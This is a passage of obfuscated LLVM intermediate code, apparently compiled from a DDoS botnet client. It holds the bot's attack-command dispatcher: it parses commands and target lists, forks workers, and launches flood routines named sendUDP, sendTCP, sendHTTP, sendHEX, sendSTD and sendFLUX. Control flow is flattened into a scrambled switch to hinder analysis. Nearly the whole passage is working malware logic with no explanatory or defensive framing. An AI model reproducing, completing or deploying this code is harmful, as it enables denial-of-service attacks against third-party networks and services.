  %171 = icmp ne i8* %170, null
  %172 = select i1 %171, i32 1250665703, i32 -1576385215
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i8*, i8** %5, align 8
  %175 = call i8* @strtok(i8* %174, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %175, i8** %13, align 8
  store i32 70661477, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8*, i8** %13, align 8
  %178 = icmp ne i8* %177, null
  %179 = select i1 %178, i32 -860083445, i32 317337754
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = call i32 @listFork()
  %182 = icmp ne i32 %181, 0
  %183 = select i1 %182, i32 419319716, i32 1519441646
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i8*, i8** %13, align 8
  %186 = load i32, i32* %6, align 4
  %187 = load i32, i32* %7, align 4
  %188 = load i32, i32* %8, align 4
  %189 = load i32, i32* %9, align 4
  %190 = load i32, i32* %10, align 4
  %191 = load i32, i32* %11, align 4
  %192 = load i32, i32* %12, align 4
  call void @sendUDP(i8* %185, i32 %186, i32 %187, i32 %188, i32 %189, i32 %190, i32 %191, i32 %192)
  call void @_exit(i32 0) #12
  unreachable

; <label>:193:                                    ; preds = %loopEntry
  %194 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %194, i8** %13, align 8
  store i32 70661477, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  store i32 -435684844, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = call i32 @listFork()
  %198 = icmp ne i32 %197, 0
  %199 = select i1 %198, i32 -1636795133, i32 -881972349
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i8*, i8** %5, align 8
  %202 = load i32, i32* %6, align 4
  %203 = load i32, i32* %7, align 4
  %204 = load i32, i32* %8, align 4
  %205 = load i32, i32* %9, align 4
  %206 = load i32, i32* %10, align 4
  %207 = load i32, i32* %11, align 4
  %208 = load i32, i32* %12, align 4
  call void @sendUDP(i8* %201, i32 %202, i32 %203, i32 %204, i32 %205, i32 %206, i32 %207, i32 %208)
  call void @_exit(i32 0) #12
  unreachable

; <label>:209:                                    ; preds = %loopEntry
  store i32 -435684844, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i8**, i8*** %4, align 8
  %213 = getelementptr inbounds i8*, i8** %212, i64 0
  %214 = load i8*, i8** %213, align 8
  %215 = call i32 @strcmp(i8* %214, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i32 0, i32 0)) #10
  %216 = icmp ne i32 %215, 0
  %217 = select i1 %216, i32 765008338, i32 -1325123649
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %3, align 4
  %220 = icmp slt i32 %219, 6
  %221 = select i1 %220, i32 -1340501698, i32 -515797032
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load i8**, i8*** %4, align 8
  %224 = getelementptr inbounds i8*, i8** %223, i64 3
  %225 = load i8*, i8** %224, align 8
  %226 = call i32 @atoi(i8* %225) #10
  %227 = icmp eq i32 %226, -1
  %228 = select i1 %227, i32 -1340501698, i32 1341325026
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 2
  %232 = load i8*, i8** %231, align 8
  %233 = call i32 @atoi(i8* %232) #10
  %234 = icmp eq i32 %233, -1
  %235 = select i1 %234, i32 -1340501698, i32 -828091491
  store i32 %235, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i8**, i8*** %4, align 8
  %238 = getelementptr inbounds i8*, i8** %237, i64 4
  %239 = load i8*, i8** %238, align 8
  %240 = call i32 @atoi(i8* %239) #10
  %241 = icmp eq i32 %240, -1
  %242 = select i1 %241, i32 -1340501698, i32 1512147663
  store i32 %242, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i8**, i8*** %4, align 8
  %245 = getelementptr inbounds i8*, i8** %244, i64 4
  %246 = load i8*, i8** %245, align 8
  %247 = call i32 @atoi(i8* %246) #10
  %248 = icmp sgt i32 %247, 32
  %249 = select i1 %248, i32 -1340501698, i32 -821186328
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %3, align 4
  %252 = icmp sgt i32 %251, 6
  %253 = select i1 %252, i32 -534817693, i32 1219559683
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8**, i8*** %4, align 8
  %256 = getelementptr inbounds i8*, i8** %255, i64 6
  %257 = load i8*, i8** %256, align 8
  %258 = call i32 @atoi(i8* %257) #10
  %259 = icmp slt i32 %258, 0
  %260 = select i1 %259, i32 -1340501698, i32 1219559683
  store i32 %260, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i32, i32* %3, align 4
  %263 = icmp eq i32 %262, 8
  %264 = select i1 %263, i32 -1007255744, i32 -426479963
  store i32 %264, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 7
  %268 = load i8*, i8** %267, align 8
  %269 = call i32 @atoi(i8* %268) #10
  %270 = icmp slt i32 %269, 1
  %271 = select i1 %270, i32 -1340501698, i32 -426479963
  store i32 %271, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 1
  %276 = load i8*, i8** %275, align 8
  store i8* %276, i8** %14, align 8
  %277 = load i8**, i8*** %4, align 8
  %278 = getelementptr inbounds i8*, i8** %277, i64 2
  %279 = load i8*, i8** %278, align 8
  %280 = call i32 @atoi(i8* %279) #10
  store i32 %280, i32* %15, align 4
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 3
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #10
  store i32 %284, i32* %16, align 4
  %285 = load i8**, i8*** %4, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 4
  %287 = load i8*, i8** %286, align 8
  %288 = call i32 @atoi(i8* %287) #10
  store i32 %288, i32* %17, align 4
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 5
  %291 = load i8*, i8** %290, align 8
  store i8* %291, i8** %18, align 8
  %292 = load i32, i32* %3, align 4
  %293 = icmp eq i32 %292, 8
  %294 = select i1 %293, i32 -846714593, i32 566365135
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i8**, i8*** %4, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 7
  %298 = load i8*, i8** %297, align 8
  %299 = call i32 @atoi(i8* %298) #10
  store i32 2135958067, i32* %switchVar
  store i32 %299, i32* %.reg2mem8
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 2135958067, i32* %switchVar
  store i32 10, i32* %.reg2mem8
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %.reload9 = load i32, i32* %.reg2mem8
  store i32 %.reload9, i32* %19, align 4
  %302 = load i32, i32* %3, align 4
  %303 = icmp sgt i32 %302, 6
  %304 = select i1 %303, i32 265750443, i32 347423071
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8**, i8*** %4, align 8
  %307 = getelementptr inbounds i8*, i8** %306, i64 6
  %308 = load i8*, i8** %307, align 8
  %309 = call i32 @atoi(i8* %308) #10
  store i32 -509426593, i32* %switchVar
  store i32 %309, i32* %.reg2mem10
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  store i32 -509426593, i32* %switchVar
  store i32 0, i32* %.reg2mem10
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  store i32 %.reload11, i32* %20, align 4
  %312 = load i8*, i8** %14, align 8
  %313 = call i8* @strstr(i8* %312, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %314 = icmp ne i8* %313, null
  %315 = select i1 %314, i32 -1045318108, i32 -289137553
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load i8*, i8** %14, align 8
  %318 = call i8* @strtok(i8* %317, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %318, i8** %21, align 8
  store i32 -795317348, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = load i8*, i8** %21, align 8
  %321 = icmp ne i8* %320, null
  %322 = select i1 %321, i32 1283378294, i32 -1205627058
  store i32 %322, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = call i32 @listFork()
  %325 = icmp ne i32 %324, 0
  %326 = select i1 %325, i32 1488238495, i32 821463350
  store i32 %326, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i8*, i8** %21, align 8
  %329 = load i32, i32* %15, align 4
  %330 = load i32, i32* %16, align 4
  %331 = load i32, i32* %17, align 4
  %332 = load i8*, i8** %18, align 8
  %333 = load i32, i32* %20, align 4
  %334 = load i32, i32* %19, align 4
  call void @sendTCP(i8* %328, i32 %329, i32 %330, i32 %331, i8* %332, i32 %333, i32 %334)
  call void @_exit(i32 0) #12
  unreachable

; <label>:335:                                    ; preds = %loopEntry
  %336 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %336, i8** %21, align 8
  store i32 -795317348, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  store i32 -77728602, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i32 @listFork()
  %340 = icmp ne i32 %339, 0
  %341 = select i1 %340, i32 -1869494342, i32 1679016884
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i8*, i8** %14, align 8
  %344 = load i32, i32* %15, align 4
  %345 = load i32, i32* %16, align 4
  %346 = load i32, i32* %17, align 4
  %347 = load i8*, i8** %18, align 8
  %348 = load i32, i32* %20, align 4
  %349 = load i32, i32* %19, align 4
  call void @sendTCP(i8* %343, i32 %344, i32 %345, i32 %346, i8* %347, i32 %348, i32 %349)
  call void @_exit(i32 0) #12
  unreachable

; <label>:350:                                    ; preds = %loopEntry
  store i32 -77728602, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i8**, i8*** %4, align 8
  %354 = getelementptr inbounds i8*, i8** %353, i64 0
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @strcmp(i8* %355, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.103, i32 0, i32 0)) #10
  %357 = icmp ne i32 %356, 0
  %358 = select i1 %357, i32 -1486575137, i32 -343146349
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = load i32, i32* %3, align 4
  %361 = icmp slt i32 %360, 4
  %362 = select i1 %361, i32 1920549571, i32 225040921
  store i32 %362, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load i8**, i8*** %4, align 8
  %365 = getelementptr inbounds i8*, i8** %364, i64 2
  %366 = load i8*, i8** %365, align 8
  %367 = call i32 @atoi(i8* %366) #10
  %368 = icmp slt i32 %367, 1
  %369 = select i1 %368, i32 1920549571, i32 -1186675374
  store i32 %369, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  %371 = load i8**, i8*** %4, align 8
  %372 = getelementptr inbounds i8*, i8** %371, i64 3
  %373 = load i8*, i8** %372, align 8
  %374 = call i32 @atoi(i8* %373) #10
  %375 = icmp slt i32 %374, 1
  %376 = select i1 %375, i32 1920549571, i32 337336725
  store i32 %376, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i8**, i8*** %4, align 8
  %380 = getelementptr inbounds i8*, i8** %379, i64 1
  %381 = load i8*, i8** %380, align 8
  store i8* %381, i8** %22, align 8
  %382 = load i8**, i8*** %4, align 8
  %383 = getelementptr inbounds i8*, i8** %382, i64 2
  %384 = load i8*, i8** %383, align 8
  %385 = call i32 @atoi(i8* %384) #10
  store i32 %385, i32* %23, align 4
  %386 = load i8**, i8*** %4, align 8
  %387 = getelementptr inbounds i8*, i8** %386, i64 3
  %388 = load i8*, i8** %387, align 8
  %389 = call i32 @atoi(i8* %388) #10
  store i32 %389, i32* %24, align 4
  %390 = load i8*, i8** %22, align 8
  %391 = call i8* @strstr(i8* %390, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %392 = icmp ne i8* %391, null
  %393 = select i1 %392, i32 2090675481, i32 -1058630191
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8*, i8** %22, align 8
  %396 = call i8* @strtok(i8* %395, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %396, i8** %25, align 8
  store i32 173950894, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = load i8*, i8** %25, align 8
  %399 = icmp ne i8* %398, null
  %400 = select i1 %399, i32 1393254962, i32 -622498965
  store i32 %400, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load i8*, i8** %25, align 8
  %403 = load i32, i32* %23, align 4
  %404 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %402, i32 %403, i32 %404)
  %405 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %405, i8** %25, align 8
  store i32 173950894, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  store i32 -1929199713, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  %408 = load i8*, i8** %22, align 8
  %409 = load i32, i32* %23, align 4
  %410 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %408, i32 %409, i32 %410)
  store i32 -1929199713, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i8**, i8*** %4, align 8
  %414 = getelementptr inbounds i8*, i8** %413, i64 0
  %415 = load i8*, i8** %414, align 8
  %416 = call i32 @strcmp(i8* %415, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.104, i32 0, i32 0)) #10
  %417 = icmp ne i32 %416, 0
  %418 = select i1 %417, i32 -885642239, i32 126424439
  store i32 %418, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = load i32, i32* %3, align 4
  %421 = icmp slt i32 %420, 6
  %422 = select i1 %421, i32 1729933109, i32 -31124772
  store i32 %422, i32* %switchVar
  br label %loopEnd

; <label>:423:                                    ; preds = %loopEntry
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 3
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @atoi(i8* %426) #10
  %428 = icmp slt i32 %427, 1
  %429 = select i1 %428, i32 1729933109, i32 1180036674
  store i32 %429, i32* %switchVar
  br label %loopEnd

; <label>:430:                                    ; preds = %loopEntry
  %431 = load i8**, i8*** %4, align 8
  %432 = getelementptr inbounds i8*, i8** %431, i64 5
  %433 = load i8*, i8** %432, align 8
  %434 = call i32 @atoi(i8* %433) #10
  %435 = icmp slt i32 %434, 1
  %436 = select i1 %435, i32 1729933109, i32 978809714
  store i32 %436, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  %439 = call i32 @listFork()
  %440 = icmp ne i32 %439, 0
  %441 = select i1 %440, i32 163730215, i32 -1612288968
  store i32 %441, i32* %switchVar
  br label %loopEnd

; <label>:442:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 1
  %446 = load i8*, i8** %445, align 8
  %447 = load i8**, i8*** %4, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 2
  %449 = load i8*, i8** %448, align 8
  %450 = load i8**, i8*** %4, align 8
  %451 = getelementptr inbounds i8*, i8** %450, i64 3
  %452 = load i8*, i8** %451, align 8
  %453 = call i32 @atoi(i8* %452) #10
  %454 = trunc i32 %453 to i16
  %455 = load i8**, i8*** %4, align 8
  %456 = getelementptr inbounds i8*, i8** %455, i64 4
  %457 = load i8*, i8** %456, align 8
  %458 = load i8**, i8*** %4, align 8
  %459 = getelementptr inbounds i8*, i8** %458, i64 5
  %460 = load i8*, i8** %459, align 8
  %461 = call i32 @atoi(i8* %460) #10
  %462 = load i8**, i8*** %4, align 8
  %463 = getelementptr inbounds i8*, i8** %462, i64 6
  %464 = load i8*, i8** %463, align 8
  %465 = call i32 @atoi(i8* %464) #10
  call void @sendHEX(i8* %446, i8* %449, i16 zeroext %454, i8* %457, i32 %461, i32 %465)
  call void @exit(i32 0) #14
  unreachable

; <label>:466:                                    ; preds = %loopEntry
  %467 = load i8**, i8*** %4, align 8
  %468 = getelementptr inbounds i8*, i8** %467, i64 0
  %469 = load i8*, i8** %468, align 8
  %470 = call i32 @strcmp(i8* %469, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %471 = icmp ne i32 %470, 0
  %472 = select i1 %471, i32 887343715, i32 -1868850264
  store i32 %472, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load i32, i32* %3, align 4
  %475 = icmp slt i32 %474, 4
  %476 = select i1 %475, i32 847532596, i32 872577960
  store i32 %476, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  %478 = load i8**, i8*** %4, align 8
  %479 = getelementptr inbounds i8*, i8** %478, i64 2
  %480 = load i8*, i8** %479, align 8
  %481 = call i32 @atoi(i8* %480) #10
  %482 = icmp slt i32 %481, 1
  %483 = select i1 %482, i32 847532596, i32 871088524
  store i32 %483, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  %485 = load i8**, i8*** %4, align 8
  %486 = getelementptr inbounds i8*, i8** %485, i64 3
  %487 = load i8*, i8** %486, align 8
  %488 = call i32 @atoi(i8* %487) #10
  %489 = icmp slt i32 %488, 1
  %490 = select i1 %489, i32 847532596, i32 -1962950960
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %493 = load i8**, i8*** %4, align 8
  %494 = getelementptr inbounds i8*, i8** %493, i64 1
  %495 = load i8*, i8** %494, align 8
  store i8* %495, i8** %26, align 8
  %496 = load i8**, i8*** %4, align 8
  %497 = getelementptr inbounds i8*, i8** %496, i64 2
  %498 = load i8*, i8** %497, align 8
  %499 = call i32 @atoi(i8* %498) #10
  store i32 %499, i32* %27, align 4
  %500 = load i8**, i8*** %4, align 8
  %501 = getelementptr inbounds i8*, i8** %500, i64 3
  %502 = load i8*, i8** %501, align 8
  %503 = call i32 @atoi(i8* %502) #10
  store i32 %503, i32* %28, align 4
  %504 = load i8*, i8** %26, align 8
  %505 = call i8* @strstr(i8* %504, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %506 = icmp ne i8* %505, null
  %507 = select i1 %506, i32 -664910208, i32 -495658411
  store i32 %507, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i8*, i8** %26, align 8
  %510 = call i8* @strtok(i8* %509, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %510, i8** %29, align 8
  store i32 -359037364, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i8*, i8** %29, align 8
  %513 = icmp ne i8* %512, null
  %514 = select i1 %513, i32 13304878, i32 -1904140873
  store i32 %514, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = load i8*, i8** %29, align 8
  %517 = load i32, i32* %27, align 4
  %518 = load i32, i32* %28, align 4
  call void @sendSTD(i8* %516, i32 %517, i32 %518)
  %519 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %519, i8** %29, align 8
  store i32 -359037364, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  store i32 1650404351, i32* %switchVar
  br label %loopEnd

; <label>:521:                                    ; preds = %loopEntry
  %522 = load i8*, i8** %26, align 8
  %523 = load i32, i32* %27, align 4
  %524 = load i32, i32* %28, align 4
  call void @sendSTD(i8* %522, i32 %523, i32 %524)
  store i32 1650404351, i32* %switchVar
  br label %loopEnd

; <label>:525:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = load i8**, i8*** %4, align 8
  %528 = getelementptr inbounds i8*, i8** %527, i64 0
  %529 = load i8*, i8** %528, align 8
  %530 = call i32 @strcmp(i8* %529, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i32 0, i32 0)) #10
  %531 = icmp ne i32 %530, 0
  %532 = select i1 %531, i32 364545876, i32 -483004823
  store i32 %532, i32* %switchVar
  br label %loopEnd

; <label>:533:                                    ; preds = %loopEntry
  %534 = load i32, i32* %3, align 4
  %535 = icmp slt i32 %534, 6
  %536 = select i1 %535, i32 -676097204, i32 -1548544129
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:538:                                    ; preds = %loopEntry
  %539 = load i8**, i8*** %4, align 8
  %540 = getelementptr inbounds i8*, i8** %539, i64 1
  %541 = load i8*, i8** %540, align 8
  store i8* %541, i8** %30, align 8
  %542 = load i8**, i8*** %4, align 8
  %543 = getelementptr inbounds i8*, i8** %542, i64 2
  %544 = load i8*, i8** %543, align 8
  %545 = call i32 @atoi(i8* %544) #10
  store i32 %545, i32* %31, align 4
  %546 = load i8**, i8*** %4, align 8
  %547 = getelementptr inbounds i8*, i8** %546, i64 3
  %548 = load i8*, i8** %547, align 8
  %549 = call i32 @atoi(i8* %548) #10
  store i32 %549, i32* %32, align 4
  %550 = load i8**, i8*** %4, align 8
  %551 = getelementptr inbounds i8*, i8** %550, i64 4
  %552 = load i8*, i8** %551, align 8
  %553 = call i32 @atoi(i8* %552) #10
  store i32 %553, i32* %33, align 4
  %554 = load i32, i32* %3, align 4
  %555 = icmp eq i32 %554, 7
  %556 = select i1 %555, i32 70221085, i32 342329549
  store i32 %556, i32* %switchVar
  br label %loopEnd

; <label>:557:                                    ; preds = %loopEntry
  %558 = load i8**, i8*** %4, align 8
  %559 = getelementptr inbounds i8*, i8** %558, i64 6
  %560 = load i8*, i8** %559, align 8
  %561 = call i32 @atoi(i8* %560) #10
  store i32 -2059425739, i32* %switchVar
  store i32 %561, i32* %.reg2mem12
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  store i32 -2059425739, i32* %switchVar
  store i32 10, i32* %.reg2mem12
  br label %loopEnd

; <label>:563:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  store i32 %.reload13, i32* %34, align 4
  %564 = load i32, i32* %3, align 4
  %565 = icmp sgt i32 %564, 5
  %566 = select i1 %565, i32 818352030, i32 -1056423967
  store i32 %566, i32* %switchVar
  br label %loopEnd

; <label>:567:                                    ; preds = %loopEntry
  %568 = load i8**, i8*** %4, align 8
  %569 = getelementptr inbounds i8*, i8** %568, i64 5
  %570 = load i8*, i8** %569, align 8
  %571 = call i32 @atoi(i8* %570) #10
  store i32 915476590, i32* %switchVar
  store i32 %571, i32* %.reg2mem14
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  store i32 915476590, i32* %switchVar
  store i32 0, i32* %.reg2mem14
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  %.reload15 = load i32, i32* %.reg2mem14
  store i32 %.reload15, i32* %35, align 4
  %574 = load i8*, i8** %30, align 8
  %575 = call i8* @strstr(i8* %574, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %576 = icmp ne i8* %575, null
  %577 = select i1 %576, i32 1178692440, i32 -924565691
  store i32 %577, i32* %switchVar
  br label %loopEnd

; <label>:578:                                    ; preds = %loopEntry
  %579 = load i8*, i8** %30, align 8
  %580 = call i8* @strtok(i8* %579, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %580, i8** %36, align 8
  store i32 1068728804, i32* %switchVar
  br label %loopEnd

; <label>:581:                                    ; preds = %loopEntry
  %582 = load i8*, i8** %36, align 8
  %583 = icmp ne i8* %582, null
  %584 = select i1 %583, i32 -500874053, i32 409156036
  store i32 %584, i32* %switchVar
  br label %loopEnd

; <label>:585:                                    ; preds = %loopEntry
  %586 = call i32 @listFork()
  %587 = icmp ne i32 %586, 0
  %588 = select i1 %587, i32 -1804055567, i32 -1955209286
  store i32 %588, i32* %switchVar
  br label %loopEnd

; <label>:589:                                    ; preds = %loopEntry
  %590 = load i8*, i8** %36, align 8
  %591 = load i32, i32* %31, align 4
  %592 = load i32, i32* %32, align 4
  %593 = load i32, i32* %33, align 4
  %594 = load i32, i32* %35, align 4
  %595 = load i32, i32* %34, align 4
  call void @sendFLUX(i8* %590, i32 %591, i32 %592, i32 %593, i32 %594, i32 %595)
  call void @_exit(i32 0) #12
  unreachable

; <label>:596:                                    ; preds = %loopEntry
  %597 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %597, i8** %36, align 8
  store i32 1068728804, i32* %switchVar
  br label %loopEnd

; <label>:598:                                    ; preds = %loopEntry
  store i32 276206697, i32* %switchVar
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = call i32 @listFork()
  %601 = icmp ne i32 %600, 0
  %602 = select i1 %601, i32 -1420553253, i32 247422073
  store i32 %602, i32* %switchVar
  br label %loopEnd

; <label>:603:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:604:                                    ; preds = %loopEntry
  %605 = load i8*, i8** %30, align 8
  %606 = load i32, i32* %31, align 4
  %607 = load i32, i32* %32, align 4
  %608 = load i32, i32* %33, align 4
  %609 = load i32, i32* %35, align 4
  %610 = load i32, i32* %34, align 4
  call void @sendFLUX(i8* %605, i32 %606, i32 %607, i32 %608, i32 %609, i32 %610)
  call void @_exit(i32 0) #12
  unreachable

; <label>:611:                                    ; preds = %loopEntry
  store i32 364545876, i32* %switchVar
  br label %loopEnd

; <label>:612:                                    ; preds = %loopEntry
  %613 = load i8**, i8*** %4, align 8
  %614 = getelementptr inbounds i8*, i8** %613, i64 0
  %615 = load i8*, i8** %614, align 8
  %616 = call i32 @strcmp(i8* %615, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #10
  %617 = icmp ne i32 %616, 0
  %618 = select i1 %617, i32 356111650, i32 -1343267751
  store i32 %618, i32* %switchVar
  br label %loopEnd

; <label>:619:                                    ; preds = %loopEntry
  %620 = load i32, i32* %3, align 4
  %621 = icmp slt i32 %620, 6
  %622 = select i1 %621, i32 1146977151, i32 989480257
  store i32 %622, i32* %switchVar
  br label %loopEnd

; <label>:623:                                    ; preds = %loopEntry
  %624 = load i8**, i8*** %4, align 8
  %625 = getelementptr inbounds i8*, i8** %624, i64 3
  %626 = load i8*, i8** %625, align 8
  %627 = call i32 @atoi(i8* %626) #10
  %628 = icmp eq i32 %627, -1
  %629 = select i1 %628, i32 1146977151, i32 646882254
  store i32 %629, i32* %switchVar
  br label %loopEnd

; <label>:630:                                    ; preds = %loopEntry
  %631 = load i8**, i8*** %4, align 8
